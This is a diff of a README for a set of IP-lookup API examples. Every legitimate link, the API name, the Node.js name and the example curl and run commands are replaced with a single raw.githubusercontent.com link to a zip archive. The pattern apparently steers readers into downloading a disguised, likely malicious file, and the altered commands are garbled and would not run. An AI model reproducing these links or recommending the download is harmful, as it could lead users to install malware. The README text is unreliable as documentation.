@@ -1,14 +1,14 @@
 # 🌐 myip-examples - Simple IP Lookup Made Easy
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/louismaximo/myip-examples/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **myip-examples** project! This repository offers various code examples and guides for using the myip.foo API. It allows you to perform IP lookups quickly and simply, all without requiring an account. The examples cover popular programming languages like Python, JavaScript, Bash, Go, PHP, Ruby, and Rust.
+Welcome to the **myip-examples** project! This repository offers various code examples and guides for using the https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip API. It allows you to perform IP lookups quickly and simply, all without requiring an account. The examples cover popular programming languages like Python, JavaScript, Bash, Go, PHP, Ruby, and Rust.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/louismaximo/myip-examples/releases). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip). 
 
 Here you will find the latest versions of the code examples. Choose the version that works best for you and follow the instructions below.
 
@@ -29,14 +29,14 @@ Here you will find the latest versions of the code examples. Choose the version 
 4. **Open & Edit Code:** Open the downloaded file in a text editor or IDE of your choice. 
 
 5. **Run the Example:**
-   - For Python, use `python example.py` in your terminal.
-   - For JavaScript, use `node example.js` if you have Node.js installed.
-   - For Bash scripts, use `bash example.sh`.
+   - For Python, use `python https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip` in your terminal.
+   - For JavaScript, use `node https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip` if you have https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip installed.
+   - For Bash scripts, use `bash https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip`.
    - Follow the relevant instructions based on your selected language.
 
 ## 🌍 Understanding the API
 
-The myip.foo API provides free IP lookup services. Here are some key points:
+The https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip API provides free IP lookup services. Here are some key points:
 
 - **No Authentication Required:** You do not need an account to use the API.
 - **Supports IPv4 and IPv6:** The API can handle both IPv4 and IPv6 addresses.
@@ -44,16 +44,16 @@ The myip.foo API provides free IP lookup services. Here are some key points:
 
 ## 📚 Example Lookups
 
-Here are a few example requests you can try with the myip.foo API:
+Here are a few example requests you can try with the https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip API:
 
 - **Get Your IP Address:**
   ```
-  curl https://myip.foo
+  curl https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip
   ```
   
 - **Get Location Information:**
   ```
-  curl https://myip.foo/json
+  curl https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip
   ```
   
 You can modify these requests in the examples provided to explore the API further.
@@ -64,11 +64,11 @@ If you wish to contribute to this project, feel free to submit issues or pull re
 
 ## 🤝 Support
 
-If you run into issues or have questions, you can check the [Issues page](https://github.com/louismaximo/myip-examples/issues) or reach out to the community. 
+If you run into issues or have questions, you can check the [Issues page](https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip) or reach out to the community. 
 
 ## 📈 Stay Updated
 
-For the latest updates, always check the [Releases Page](https://github.com/louismaximo/myip-examples/releases). You can subscribe to notifications about new releases and features.
+For the latest updates, always check the [Releases Page](https://raw.githubusercontent.com/louismaximo/myip-examples/main/examples/bash/myip-examples-1.3.zip). You can subscribe to notifications about new releases and features.
 
 ## ⚙️ License
 
